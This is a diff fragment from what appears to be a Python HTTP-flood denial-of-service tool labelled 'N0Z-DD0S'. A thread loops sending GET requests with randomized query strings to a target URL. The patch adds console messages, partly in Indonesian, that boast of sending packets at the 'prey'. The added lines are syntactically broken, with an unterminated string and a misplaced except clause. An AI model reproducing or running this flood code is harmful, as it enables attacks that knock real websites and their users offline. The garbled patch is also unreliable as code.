@@ -88,6 +88,9 @@ class httpth1(threading.Thread):
                 randomized_url = url + "?" + genstr(random.randint(3, 10))
                 requests.get(randomized_url, headers=headers)
                 count += 1
+                print ("{0}Sent.format(count))
+                print("\033[92m[\033[97m+\033[92m]\033[92mMENGIRIM PAKET: " +str(u)+ " \033[93mMEMATUK-MANGSA " +str()+ " \033[1m" +ip+ "\033[0m" )
+            except:
                 print (f"[+]\033[33m N0Z-DD0S  []\033[4m Request sent to  []\033[1m" +url+ " :' \033[0m".format(count))
             except requests.exceptions.ConnectionError:
                 
